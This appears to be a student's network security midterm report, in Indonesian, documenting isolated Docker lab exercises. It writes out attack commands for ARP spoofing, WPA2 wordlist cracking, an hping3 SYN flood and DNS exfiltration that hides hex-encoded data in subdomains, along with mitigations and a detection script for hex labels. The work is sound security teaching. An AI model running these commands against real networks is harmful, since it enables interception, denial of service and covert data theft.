\# JAWABAN UTS NETWORK SECURITY

\*\*NAMA:\*\* Anisa Febrianti
\*\*KELAS:\*\* TIF RP 24E CNS

\*\*NIM:\*\* 24552011287

\*\*Kasus:\*\* 7



\## Perhitungan Kasus



\- Digit NIM: 2, 4, 5, 5, 2, 0, 1, 1, 2, 8, 7

\- Jumlah: 37

\- Sisa bagi 10: 7

\- Kasus: 7



\## Tugas 1 (Pertemuan 1): Docker dan Volume



\### A. Membuat Docker Volume



\*\*Perintah:\*\*

```powershell

docker volume create vol-k7

```



\*\*Output:\*\*

```text

vol-k7

```



\*\*Analisis:\*\*



Docker Volume bernama `vol-k7` berhasil dibuat. Volume ini digunakan sebagai media penyimpanan permanen agar data tetap tersedia meskipun container yang menggunakannya dihapus.

Output terminal:



### B. Menulis File ke Dalam Volume

**Perintah:**
```powershell
docker run --name w-k7 -v vol-k7:/data alpine sh -c 'echo 24552011287 > /data/laporan-k7.txt'
```

**Verifikasi container:**
```powershell
docker ps -a --filter "name=w-k7"
```

**Hasil:** Container `w-k7` berstatus `Exited (0)`.

**Analisis:** Container berhasil menjalankan perintah penulisan NIM `24552011287` ke file `laporan-k7.txt` pada Docker Volume `vol-k7`. Selanjutnya, container penulis dihapus untuk menguji apakah data tetap tersimpan.

Penghapusan container:
docker rm w-k7

Output:
w-k7

Keterangan:
Container penulis berhasil dihapus tanpa menghapus Docker Volume vol-k7.

### C. Menguji Persistensi Data

**Perintah:**
```powershell
docker run --rm -v vol-k7:/data alpine cat /data/laporan-k7.txt
```

**Output:**
```text
24552011287
```

**Analisis:**

Setelah container penulis `w-k7` dihapus, file `laporan-k7.txt` tetap dapat dibaca melalui container baru. Hal ini membuktikan bahwa Docker Volume `vol-k7` menyimpan data secara persisten dan tidak bergantung pada siklus hidup container.

**Pengujian Docker Compose**

Perintah:
```powershell
docker compose -p k7 -f b/b1-compose/docker-compose.yml up -d
docker compose -p k7 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
```

Hasil:
- Network `k7_lab` berhasil dibuat.
- Container `k7-attacker-1` dan `k7-target-1` berhasil dijalankan.
- Perintah wget berhasil mengambil halaman HTML dari server target.
- Output menampilkan `Welcome to nginx!`.

Analisis:
Pengujian membuktikan bahwa container attacker dapat berkomunikasi dengan container target melalui jaringan internal Docker. Nama layanan `target` dapat digunakan sebagai hostname karena Docker Compose menyediakan DNS internal untuk komunikasi antarlayanan.

**Cleanup dan Verifikasi Volume**

Perintah:
```powershell
docker compose -p k7 -f b/b1-compose/docker-compose.yml down -v
docker volume inspect vol-k7
```

Hasil:
- Container `k7-target-1` berhasil dihapus.
- Container `k7-attacker-1` berhasil dihapus.
- Network `k7_lab` berhasil dihapus.
- Volume `vol-k7` masih tersedia dengan driver `local`.

Analisis:
Docker Volume memiliki siklus hidup terpisah dari container. Penghapusan container dan network Compose tidak menghapus volume `vol-k7` karena volume tersebut dibuat secara terpisah menggunakan perintah `docker volume create`. Hal ini membuktikan persistensi data pada Docker Volume.

\## Tugas 2 (Pertemuan 2): Kriptografi

**A. Enkripsi dan Dekripsi AES-256-CBC**

Perintah:
```powershell
docker run --rm -v "${PWD}:/work" uts-openssl sh -c 'echo isi laporan k7 > /work/laporan-k7.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in /work/laporan-k7.txt -out /work/laporan-k7.enc -pass pass:kunci-k7-2026 && sha256sum /work/laporan-k7.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in /work/laporan-k7.enc -out /work/hasil-k7.txt -pass pass:kunci-k7-2026 && sha256sum /work/hasil-k7.txt'
```

Hasil SHA-256:
- File asli: `ce95abe24bc56214a7d90041c2365a4f762a26bd70d34900163fa746cd0011b2`
- File hasil dekripsi: `ce95abe24bc56214a7d90041c2365a4f762a26bd70d34900163fa746cd0011b2`

Analisis:
File berhasil dienkripsi menggunakan algoritma AES-256-CBC dengan PBKDF2 sebagai mekanisme derivasi kunci. File terenkripsi kemudian berhasil didekripsi menggunakan kata sandi yang sama. Kedua hash SHA-256 identik, sehingga dapat disimpulkan bahwa hasil dekripsi sama dengan file asli dan integritas data terjaga.

**B. Pembuatan Sertifikat Digital RSA**

Perintah:
```powershell
docker run --rm -v "${PWD}:/work" uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout /work/key-k7.pem -out /work/cert-k7.pem -days 30 -subj /CN=k7.uts.local && openssl x509 -in /work/cert-k7.pem -noout -subject -issuer -dates'
```

Hasil:
- Subject: `CN=k7.uts.local`
- Issuer: `CN=k7.uts.local`
- notBefore: `Nov 22 08:45:27 2026 GMT`
- notAfter: `Dec 22 08:45:27 2026 GMT`

Analisis:
Berhasil dibuat sertifikat digital self-signed menggunakan algoritma RSA dengan panjang kunci 2048-bit. Subject dan Issuer memiliki nilai yang sama karena sertifikat ditandatangani oleh dirinya sendiri. Sertifikat berlaku selama 30 hari, mulai 22 November 2026 sampai 22 Desember 2026.





\## Tugas 3 (Pertemuan 3): ARP Spoofing dan Mitigasi


### 1. Topologi dan Alamat Jaringan

Jaringan Docker yang digunakan adalah `lab-arp-k7` dengan tiga container:

- Korban: `172.18.0.2`
- Gateway: `172.18.0.3`
- Penyerang: `172.18.0.4`

MAC Address gateway asli: `8e:2f:09:69:8f:ff`

MAC Address penyerang: `be:09:88:92:8e:95`

### 2. Kondisi ARP Cache Sebelum Serangan

Sebelum serangan dilakukan, IP gateway `172.18.0.3` dipetakan ke MAC Address asli `8e:2f:09:69:8f:ff`.

### 3. Hasil Simulasi ARP Spoofing

Simulasi ARP Spoofing dilakukan menggunakan perintah `arpspoof` dari container penyerang dengan target korban selama maksimal 20 detik.

Setelah serangan dijalankan, ARP Cache korban menunjukkan:

`172.18.0.3 dev eth0 lladdr be:09:88:92:8e:95 REACHABLE`

Hasil tersebut menunjukkan bahwa IP gateway `172.18.0.3` berhasil dipetakan ke MAC Address penyerang, yaitu `be:09:88:92:8e:95`.

Hal ini membuktikan bahwa penyerang berhasil mengirimkan pesan ARP palsu sehingga korban memperbarui pemetaan IP gateway ke MAC Address penyerang.

### 4. Mitigasi Menggunakan Static ARP

Mitigasi dilakukan dengan menetapkan pemetaan IP gateway ke MAC Address aslinya menggunakan perintah:

`ip neigh replace 172.18.0.3 lladdr 8e:2f:09:69:8f:ff nud permanent dev eth0`

Hasil verifikasi ARP Cache setelah mitigasi:

`172.18.0.3 dev eth0 lladdr 8e:2f:09:69:8f:ff PERMANENT`

Hasil tersebut menunjukkan bahwa pemetaan IP gateway telah dikembalikan ke MAC Address asli dan ditetapkan secara permanen.

### 5. Kesimpulan

Simulasi membuktikan bahwa ARP Spoofing dapat memanipulasi pemetaan alamat IP gateway menjadi MAC Address penyerang. Mitigasi menggunakan Static ARP berhasil mengembalikan dan mempertahankan pemetaan ke MAC Address gateway asli. Dengan demikian, manipulasi ARP melalui pembelajaran ARP dinamis biasa dapat dicegah pada perangkat korban.



\## Tugas 4 (Pertemuan 4): WPA2 Handshake

### 1. Persiapan File Capture

Pada awal pengujian, file `handshake-k7.cap` yang disediakan dalam repository Case 7 tidak dapat dibaca dengan benar oleh Aircrack-ng.

Hasil pengujian menunjukkan:
- Aircrack-ng: `This file is not a regular 802.11 (wireless) capture`
- Tcpdump: `invalid packet capture length`

Karena file tersebut tidak valid, dilakukan pengujian menggunakan sampel capture dari repository resmi Aircrack-ng.

Sumber:
https://github.com/aircrack-ng/aircrack-ng

File yang digunakan:
`aircrack-samples/test/wpa2.eapol.cap`

Ukuran file: 802 byte.

### 2. Verifikasi File Capture dengan Tcpdump

Perintah:

```powershell
docker run --rm -v "${PWD}/aircrack-samples/test:/work" uts-kali-tools tcpdump -nn -r /work/wpa2.eapol.cap
```

Hasil menunjukkan bahwa file dapat dibaca dan berisi:
- 1 paket Beacon dengan ESSID `Harkonen`.
- 4 paket EAPOL Key.

### 3. Identifikasi Handshake dengan Aircrack-ng

Perintah:

```powershell
docker run --rm -v "${PWD}/aircrack-samples/test:/work" uts-kali-tools aircrack-ng /work/wpa2.eapol.cap
```

Hasil pengujian:

- Jumlah paket: 5
- BSSID: `00:14:6C:7E:40:80`
- ESSID: `Harkonen`
- Enkripsi menurut Aircrack-ng: WPA
- Handshake: 1 handshake

Aircrack-ng berhasil mengenali jaringan dan mendeteksi satu handshake pada file capture.

### 4. Pengujian Menggunakan Wordlist Case 7

Perintah:

```powershell
docker run --rm -v "${PWD}/aircrack-samples/test:/capture" -v "${PWD}/samples:/wordlists" uts-kali-tools aircrack-ng -w /wordlists/wordlist-k7.txt /capture/wpa2.eapol.cap
```

Hasil pengujian:

```text
[00:00:00] 20/20 keys tested (179.81 k/s)

KEY NOT FOUND
```

Aircrack-ng berhasil menguji 20 kandidat kata sandi dari wordlist Case 7, tetapi tidak menemukan kata sandi yang cocok dengan handshake pada capture.

### 5. Analisis dan Kesimpulan

Pengujian menunjukkan bahwa Aircrack-ng dapat membaca file capture, mengidentifikasi jaringan dengan ESSID `Harkonen`, serta mendeteksi satu handshake.

Namun, pengujian terhadap 20 kandidat kata sandi menghasilkan `KEY NOT FOUND`. Hal ini berarti tidak ada kandidat dalam wordlist Case 7 yang cocok dengan handshake pada sampel tersebut.

Perlu dicatat bahwa file capture yang digunakan merupakan sampel publik Aircrack-ng, bukan capture asli Case 7. Oleh karena itu, hasil ini merupakan pengujian alternatif dan belum membuktikan keberhasilan pemulihan kata sandi pada jaringan yang ditentukan dalam soal.

File capture asli Case 7 yang disediakan repository juga tidak dapat digunakan karena terindikasi rusak atau tidak valid.
Output terminal:



\## Tugas 5 (Pertemuan 5): ICMP dengan Scapy

### 1. Tujuan

Praktikum ini bertujuan memahami cara membuat dan mengirim paket ICMP Echo Request menggunakan Scapy serta membaca balasan dari host tujuan.

### 2. Script yang Digunakan

File: `kasus/k5-scapy/kirim_icmp.py`

Script menggunakan library Scapy dengan komponen:
- `IP`: menentukan alamat IP tujuan.
- `ICMP`: membuat paket ICMP Echo Request.
- `sr1()`: mengirim paket dan menunggu satu balasan.

### 3. Topologi Pengujian

- Pengirim Scapy: `172.18.0.5`
- Korban: `172.18.0.2`
- Network Docker: `lab-arp-k7`

### 4. Perintah Pengujian

```powershell
docker run --rm --network lab-arp-k7 -v "${PWD}:/work" uts-kali-tools python3 /work/kasus/k5-scapy/kirim_icmp.py 172.18.0.2
```

### 5. Hasil Pengujian

```text
Mengirim: IP / ICMP 172.18.0.5 > 172.18.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```

### 6. Analisis

Berdasarkan hasil pengujian, Scapy berhasil mengirimkan paket ICMP Echo Request dari alamat IP `172.18.0.5` menuju host korban `172.18.0.2`.

Korban memberikan balasan dengan TTL sebesar 64 dan tipe ICMP 0. Tipe ICMP 0 menunjukkan pesan Echo Reply.

Hal ini membuktikan bahwa komunikasi ICMP antara pengirim dan korban pada jaringan Docker berhasil dilakukan.

### 7. Kesimpulan

Scapy dapat digunakan untuk membangun, mengirim, dan membaca paket ICMP. Keberhasilan menerima Echo Reply menunjukkan bahwa host tujuan dapat dijangkau melalui jaringan lokal yang digunakan dalam praktikum.



\## Tugas 6 (Pertemuan 6): SYN Flood dan Three-Way Handshake

### A. Tujuan Praktikum

Praktikum ini bertujuan untuk memahami proses pembentukan koneksi TCP melalui mekanisme three-way handshake serta mempelajari konsep serangan SYN Flood. Pengujian dilakukan menggunakan Docker dalam jaringan internal agar seluruh simulasi terbatas pada lingkungan praktikum.

Tools yang digunakan:
1. Docker dan Docker Compose.
2. Nginx sebagai server target.
3. hping3 untuk mengirim paket SYN.
4. tcpdump untuk mengamati lalu lintas TCP.
5. netstat untuk memeriksa status koneksi TCP.

### B. Persiapan Lingkungan Praktikum

Praktikum menggunakan konfigurasi Docker Compose yang telah disediakan pada file `b/b3-syn-flood/docker-compose.yml`.

Konfigurasi terdiri dari dua layanan:

- **Target:** menggunakan image `nginx:alpine` sebagai server web.
- **Attacker:** menggunakan image `uts-kali-tools` yang menyediakan tools pengujian jaringan, termasuk hping3, tcpdump, dan curl.

Kedua layanan berada pada jaringan Docker internal bernama `k7_lab`. Jaringan ini tidak mengekspos layanan ke jaringan eksternal.

Perintah untuk menjalankan lingkungan praktikum:

```powershell
docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml up -d
```

Hasil:
- Network `k7_lab` berhasil dibuat.
- Container `k7-attacker-1` berhasil dijalankan.
- Container `k7-target-1` berhasil dijalankan.

Pemeriksaan container:

```powershell
docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml ps
```

Hasil menunjukkan bahwa kedua container berada dalam status `Up`.

### C. Pemeriksaan Kondisi Awal Server

Sebelum melakukan pengujian, dilakukan pemeriksaan koneksi TCP pada server target menggunakan perintah:

```powershell
docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec target sh -c "netstat -ant"
```

Hasil pemeriksaan menunjukkan bahwa server Nginx sedang mendengarkan koneksi pada port 80 dengan status:

```text
tcp  0  0  0.0.0.0:80  0.0.0.0:*  LISTEN
tcp  0  0  :::80       :::*       LISTEN
```

Hal ini menunjukkan bahwa layanan HTTP pada server target aktif dan siap menerima koneksi.

Selanjutnya, dilakukan pemeriksaan jumlah koneksi dengan status `SYN_RECV`:

```powershell
docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec target sh -c "netstat -ant | grep -c SYN_RECV"
```

Hasil:

```text
0
```

Artinya, pada saat pemeriksaan awal tidak ditemukan koneksi setengah terbuka yang berstatus `SYN_RECV`.

### D. Simulasi SYN Flood

SYN Flood merupakan salah satu bentuk serangan Denial of Service (DoS) yang memanfaatkan proses pembentukan koneksi TCP. Penyerang mengirimkan banyak paket SYN sehingga server harus menangani permintaan koneksi yang belum menyelesaikan proses three-way handshake.

Pengujian simulasi dilakukan dari container attacker menggunakan perintah:

```powershell
docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
```

Keterangan:
- `-S`: mengatur flag SYN pada paket TCP.
- `-p 80`: menentukan port tujuan, yaitu port HTTP.
- `--flood`: mengirimkan paket secara cepat tanpa menunggu respons satu per satu.
- `timeout 15`: membatasi proses pengujian selama 15 detik.
- `target`: nama layanan server tujuan dalam jaringan Docker.

Perintah dijalankan dalam mode detached sehingga tidak menampilkan statistik pengiriman secara langsung pada terminal.

Setelah pengujian, dilakukan pemeriksaan kembali terhadap koneksi berstatus `SYN_RECV`:

```powershell
docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec target sh -c "netstat -ant | grep -c SYN_RECV"
```

Hasil:

```text
0
```

Hasil tersebut menunjukkan bahwa pada saat pemeriksaan tidak ditemukan koneksi setengah terbuka berstatus `SYN_RECV`. Dengan demikian, belum terdapat bukti bahwa simulasi tersebut berhasil memenuhi antrean koneksi TCP server.

### E. Pemeriksaan SYN Cookies

Untuk mengetahui mekanisme perlindungan TCP yang tersedia pada server, dilakukan pemeriksaan konfigurasi SYN Cookies menggunakan perintah:

```powershell
docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec target sh -c "cat /proc/sys/net/ipv4/tcp_syncookies"
```

Hasil:

```text
1
```

Nilai `1` menunjukkan bahwa fitur TCP SYN Cookies aktif. SYN Cookies merupakan mekanisme perlindungan yang membantu server menghadapi kondisi antrean koneksi SYN yang penuh dengan cara menggunakan nilai khusus pada respons SYN-ACK.

Selanjutnya dilakukan pemeriksaan statistik TCP:

```powershell
docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec target sh -c "grep -A1 TcpExt /proc/net/netstat"
```

Berdasarkan hasil pemeriksaan, tiga nilai statistik pertama adalah:

| Parameter | Nilai |
|---|---:|
| SyncookiesSent | 0 |
| SyncookiesRecv | 0 |
| SyncookiesFailed | 0 |

Nilai tersebut menunjukkan bahwa pada saat pemeriksaan tidak tercatat pengiriman, penerimaan, maupun kegagalan validasi SYN Cookies.

Meskipun SYN Cookies aktif, hasil ini tidak membuktikan bahwa mekanisme tersebut benar-benar digunakan selama simulasi.

### F. Pengamatan TCP Three-Way Handshake

Selanjutnya dilakukan pengamatan proses pembentukan koneksi TCP normal menggunakan tcpdump. Pengujian dilakukan dengan menjalankan tcpdump pada container attacker dan mengakses server Nginx menggunakan curl.

Perintah:

```powershell
docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
```

Hasil pengamatan menunjukkan tiga tahapan utama TCP three-way handshake:

**1. SYN**

```text
172.19.0.3.35164 > 172.19.0.2.80: Flags [S]
```

Attacker dengan alamat IP `172.19.0.3` mengirimkan paket SYN menuju server target dengan alamat IP `172.19.0.2` pada port 80.

**2. SYN-ACK**

```text
172.19.0.2.80 > 172.19.0.3.35164: Flags [S.]
```

Server target memberikan respons SYN-ACK sebagai tanda bahwa server menerima permintaan koneksi.

**3. ACK**

```text
172.19.0.3.35164 > 172.19.0.2.80: Flags [.], ack 1
```

Attacker mengirimkan ACK sebagai respons terakhir. Setelah tahap ini, koneksi TCP berhasil dibentuk.

Setelah three-way handshake selesai, terlihat komunikasi HTTP dan respons `HTTP/1.1 200 OK` dari server Nginx.

Hasil akhir tcpdump:

```text
12 packets captured
12 packets received by filter
0 packets dropped by kernel
```

Hasil ini membuktikan bahwa proses pembentukan koneksi TCP normal berhasil dilakukan dan server masih dapat memberikan respons HTTP.

### G. Pengujian Paket SYN Menggunakan hping3

Selain simulasi SYN Flood, dilakukan pengujian pengiriman paket SYN secara terbatas sebanyak 10 paket untuk memastikan konektivitas attacker dengan server target.

Perintah:

```powershell
docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec attacker hping3 -S -p 80 -c 10 target
```

Hasil:

```text
HPING target (eth0 172.19.0.2): S set, 40 headers + 0 data bytes

len=44 ip=172.19.0.2 ttl=64 DF id=0 sport=80 flags=SA seq=0
len=44 ip=172.19.0.2 ttl=64 DF id=0 sport=80 flags=SA seq=1
len=44 ip=172.19.0.2 ttl=64 DF id=0 sport=80 flags=SA seq=2
len=44 ip=172.19.0.2 ttl=64 DF id=0 sport=80 flags=SA seq=3
len=44 ip=172.19.0.2 ttl=64 DF id=0 sport=80 flags=SA seq=4
len=44 ip=172.19.0.2 ttl=64 DF id=0 sport=80 flags=SA seq=5
len=44 ip=172.19.0.2 ttl=64 DF id=0 sport=80 flags=SA seq=6
len=44 ip=172.19.0.2 ttl=64 DF id=0 sport=80 flags=SA seq=7
len=44 ip=172.19.0.2 ttl=64 DF id=0 sport=80 flags=SA seq=8
len=44 ip=172.19.0.2 ttl=64 DF id=0 sport=80 flags=SA seq=9

--- target hping statistic ---
10 packets transmitted, 10 packets received, 0% packet loss
round-trip min/avg/max = 0.1/0.7/1.1 ms
```

Analisis hasil:
- Jumlah paket yang dikirim sebanyak 10 paket.
- Seluruh 10 paket mendapatkan respons dari server.
- Packet loss sebesar 0%.
- Rata-rata waktu respons sebesar 0,7 ms.
- Flag `SA` menunjukkan bahwa server memberikan respons SYN-ACK.

Hasil tersebut menunjukkan bahwa server target dapat dijangkau dan masih merespons permintaan koneksi TCP dari attacker.

Pengujian 10 paket ini merupakan pengujian konektivitas SYN secara terbatas, bukan bukti keberhasilan serangan Denial of Service.

### H. Kesimpulan

Berdasarkan seluruh rangkaian praktikum, dapat disimpulkan bahwa SYN Flood merupakan serangan yang memanfaatkan proses TCP three-way handshake dengan mengirimkan banyak permintaan koneksi SYN untuk membebani server.

Pada praktikum ini, server Nginx berhasil dijalankan dalam jaringan Docker internal dan dapat menerima koneksi TCP normal. Pengamatan menggunakan tcpdump memperlihatkan tahapan SYN, SYN-ACK, dan ACK, serta server memberikan respons HTTP `200 OK`.

Pengujian hping3 sebanyak 10 paket juga menunjukkan bahwa seluruh paket mendapatkan respons SYN-ACK dengan packet loss 0%. Sementara itu, pemeriksaan `SYN_RECV` setelah simulasi SYN Flood menunjukkan nilai 0. Fitur SYN Cookies pada server juga terdeteksi aktif dengan nilai `tcp_syncookies = 1`.

Dengan demikian, praktikum berhasil menunjukkan proses TCP three-way handshake, pengiriman paket SYN, serta pemeriksaan mekanisme perlindungan SYN Cookies. Namun, berdasarkan bukti yang diperoleh, belum dapat disimpulkan bahwa simulasi SYN Flood berhasil menyebabkan server mengalami Denial of Service atau kehabisan antrean koneksi.

Praktikum ini dilakukan pada jaringan Docker internal yang terisolasi dan tidak ditujukan untuk menyerang jaringan atau server di luar lingkungan pengujian.


\## TUGAS 7 – SIMULASI DNS EXFILTRATION DAN DETEKSI DNS MENCURIGAKAN

### A. Tujuan Praktikum

Praktikum ini bertujuan untuk memahami konsep DNS Exfiltration, yaitu teknik pengiriman data melalui protokol DNS dengan menyisipkan informasi ke dalam nama domain atau subdomain.

Selain itu, praktikum ini bertujuan untuk:
1. Mengubah data NIM menjadi format hexadecimal.
2. Mengirimkan data hexadecimal melalui query DNS.
3. Mengamati dan menyimpan aktivitas query DNS pada log server.
4. Menganalisis pola query DNS menggunakan script Python.
5. Mengembalikan data hexadecimal menjadi informasi aslinya.

Seluruh pengujian dilakukan dalam lingkungan Docker internal yang terisolasi.

### B. Persiapan Lingkungan Praktikum

Praktikum menggunakan file konfigurasi `b/b4-dns-exfil/docker-compose.yml`.

Lingkungan praktikum terdiri dari dua layanan:

- **DNS:** menggunakan image `uts-dnsmasq` sebagai server DNS.
- **Attacker:** menggunakan image `uts-kali-tools` sebagai mesin untuk menjalankan perintah pengujian DNS.

Kedua container berada dalam jaringan Docker internal bernama `k7_lab`.

Perintah untuk menjalankan lingkungan praktikum:

```powershell
docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml up -d
```

Hasil:
- Container `k7-dns-1` berhasil dijalankan.
- Container `k7-attacker-1` berhasil dijalankan.
- Container berada dalam status `Up`.

Pemeriksaan container dilakukan menggunakan:

```powershell
docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml ps
```

Hasil pemeriksaan menunjukkan bahwa layanan DNS dan attacker berhasil berjalan.

Catatan: Saat menjalankan konfigurasi Tugas 7, Docker menampilkan peringatan bahwa terdapat orphan container `k7-target-1` dari konfigurasi Tugas 6. Container tersebut tidak termasuk dalam konfigurasi Tugas 7, tetapi masih berjalan pada saat pemeriksaan.

### C. Konversi NIM ke Format Hexadecimal

Tahap pertama adalah mengubah NIM menjadi format hexadecimal. NIM yang digunakan dalam praktikum ini adalah:

```text
24552011287
```

Perintah yang digunakan:

```bash
echo -n 24552011287 | xxd -p
```

Karena perintah `xxd` tidak tersedia langsung pada PowerShell Windows, proses konversi dijalankan melalui container attacker dengan perintah:

```powershell
docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml exec attacker sh -c "echo -n 24552011287 | xxd -p"
```

Hasil:

```text
3234353532303131323837
```

Dengan demikian, NIM `24552011287` berhasil dikonversi menjadi hexadecimal `3234353532303131323837`.

Hasil hexadecimal tersebut kemudian digunakan sebagai bagian dari nama subdomain pada proses pengujian DNS.

### D. Pengiriman Data Melalui Query DNS

Tahap berikutnya adalah mengirimkan data hexadecimal sebagai bagian dari nama domain `k7.exfil.lab`.

Query DNS yang digunakan:

```text
3234353532303131323837.k7.exfil.lab
```

Pengujian pertama menggunakan perintah:

```powershell
docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131323837.k7.exfil.lab @dns
```

Perintah tersebut belum menampilkan jawaban DNS yang diharapkan. Setelah dilakukan pemeriksaan lebih lanjut, diketahui bahwa respons berasal dari resolver internal Docker `127.0.0.11`.

Selanjutnya dilakukan pemeriksaan alamat IP server DNS:

```powershell
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' k7-dns-1
```

Hasil:

```text
172.19.0.4
```

Pengujian kemudian dilakukan kembali dengan mengarahkan query secara langsung ke alamat IP server DNS:

```powershell
docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig 3234353532303131323837.k7.exfil.lab "@172.19.0.4"
```

Hasil:

```text
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 22042
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; QUESTION SECTION:
;3234353532303131323837.k7.exfil.lab. IN A

;; ANSWER SECTION:
3234353532303131323837.k7.exfil.lab. 0 IN A 10.0.0.99

;; SERVER: 172.19.0.4#53(172.19.0.4) (UDP)
```

Analisis:

Hasil pengujian menunjukkan bahwa query DNS berhasil diproses oleh server dengan status `NOERROR`. Server memberikan satu jawaban berupa alamat IP `10.0.0.99`.

Data hexadecimal NIM berhasil dikirim sebagai bagian dari nama domain melalui query DNS. Hal ini menunjukkan bagaimana protokol DNS dapat dimanfaatkan sebagai media pengiriman data.

### E. Pengambilan dan Pemeriksaan Log DNS

Setelah query berhasil dikirim, dilakukan pengambilan log dari server DNS menggunakan perintah:

```powershell
docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k7.log
```

Log kemudian diperiksa menggunakan:

```powershell
Get-Content .\dns-k7.log
```

Hasil log yang relevan:

```text
dns-1 | dnsmasq[1]: query[A] 3234353532303131323837.k7.exfil.lab from 172.19.0.3
dns-1 | dnsmasq[1]: config 3234353532303131323837.k7.exfil.lab is 10.0.0.99
```

Analisis:

Berdasarkan log tersebut:
- `query[A]` menunjukkan bahwa attacker melakukan permintaan DNS dengan tipe record A.
- `3234353532303131323837` merupakan data hexadecimal NIM.
- `k7.exfil.lab` merupakan domain yang digunakan dalam simulasi.
- `172.19.0.3` merupakan alamat IP attacker.
- `10.0.0.99` merupakan alamat IP yang diberikan sebagai jawaban DNS.

Log tersebut membuktikan bahwa query yang membawa data hexadecimal berhasil diterima dan dicatat oleh server DNS.

### F. Analisis Log Menggunakan Script Deteksi DNS

Tahap selanjutnya adalah menganalisis log DNS menggunakan script Python yang tersedia pada folder:

```text
kasus/k9-dns-detect/analisis_dns.py
```

Script ini digunakan untuk menghitung jumlah query berdasarkan domain induk serta mengidentifikasi kemungkinan query mencurigakan.

Script memiliki ketentuan deteksi:
- Menghitung jumlah query berdasarkan domain induk.
- Memeriksa label pertama pada nama domain.
- Menandai label yang memiliki panjang lebih dari 30 karakter.
- Memeriksa apakah label tersebut hanya terdiri dari karakter hexadecimal.

Perintah untuk menjalankan analisis:

```powershell
docker run --rm -v "${PWD}:/work" uts-kali-tools python3 /work/kasus/k9-dns-detect/analisis_dns.py /work/dns-k7.log
```

Pada eksekusi pertama, hasil analisis belum menampilkan domain maupun query. Setelah diperiksa, ditemukan bahwa file log yang dihasilkan melalui pengalihan output PowerShell perlu disesuaikan encoding-nya agar dapat dibaca dengan benar oleh script Python.

Encoding file kemudian dikonversi menjadi UTF-8 menggunakan perintah:

```powershell
$content = [System.IO.File]::ReadAllText("$PWD\dns-k7.log"); [System.IO.File]::WriteAllText("$PWD\dns-k7.log", $content, [System.Text.UTF8Encoding]::new($false))
```

Setelah itu, script dijalankan kembali:

```powershell
docker run --rm -v "${PWD}:/work" uts-kali-tools python3 /work/kasus/k9-dns-detect/analisis_dns.py /work/dns-k7.log
```

Hasil:

```text
Jumlah query per domain induk:
  exfil.lab: 1

Query mencurigakan (label panjang berisi hex):
```

Analisis:

Script berhasil membaca log dan menemukan satu query DNS pada domain induk `exfil.lab`.

Namun, bagian query mencurigakan tidak menampilkan hasil. Hal ini terjadi karena label hexadecimal yang digunakan memiliki panjang 22 karakter, sedangkan batas deteksi pada script adalah lebih dari 30 karakter.

Dengan demikian, query berhasil tercatat dan dianalisis, tetapi belum dikategorikan mencurigakan oleh aturan deteksi bawaan script.

### G. Dekode Hexadecimal Menjadi NIM Asli

Tahap terakhir adalah mengembalikan data hexadecimal menjadi bentuk teks aslinya.

Perintah yang digunakan:

```powershell
docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml exec attacker sh -c "echo 3234353532303131323837 | xxd -r -p"
```

Hasil:

```text
24552011287
```

Analisis:

Hasil dekode menunjukkan bahwa data hexadecimal berhasil dikembalikan menjadi NIM `24552011287`.

Hasil tersebut sesuai dengan NIM asli yang digunakan pada awal praktikum. Dengan demikian, proses konversi hexadecimal dan pengembalian data berhasil dilakukan.

### H. Kesimpulan

Berdasarkan seluruh rangkaian praktikum, dapat disimpulkan bahwa DNS dapat dimanfaatkan sebagai media pengiriman data dengan menyisipkan informasi ke dalam nama subdomain.

Dalam praktikum ini, NIM `24552011287` berhasil dikonversi menjadi hexadecimal `3234353532303131323837`, kemudian digunakan sebagai bagian dari query DNS menuju domain `k7.exfil.lab`.

Query berhasil diterima oleh server DNS dengan status `NOERROR` dan tercatat dalam log `dnsmasq`. Log tersebut menunjukkan bahwa query berasal dari attacker dengan alamat IP `172.19.0.3` dan mendapatkan jawaban berupa alamat IP `10.0.0.99`.

Script analisis DNS berhasil mengidentifikasi satu query pada domain induk `exfil.lab`. Namun, query tidak ditandai sebagai mencurigakan karena panjang label hexadecimal hanya 22 karakter, sedangkan ambang deteksi script ditetapkan lebih dari 30 karakter.

Pada tahap akhir, data hexadecimal berhasil dikembalikan menjadi NIM asli. Hal ini membuktikan bahwa data yang digunakan dalam simulasi dapat dikirim melalui query DNS dan dipulihkan kembali.

Praktikum ini memberikan pemahaman bahwa aktivitas DNS yang tidak biasa, terutama penggunaan subdomain panjang atau berisi karakter hexadecimal, dapat menjadi salah satu indikator kemungkinan DNS Exfiltration. Oleh karena itu, pemantauan log DNS dan analisis pola query penting dilakukan untuk mendeteksi aktivitas jaringan yang mencurigakan.

Seluruh simulasi dilakukan dalam jaringan Docker internal yang terisolasi dan tidak ditujukan untuk mengirimkan data ke server eksternal.

## TUGAS 8 – CLEANUP DAN VERIFIKASI RESOURCE DOCKER

### A. Tujuan Cleanup

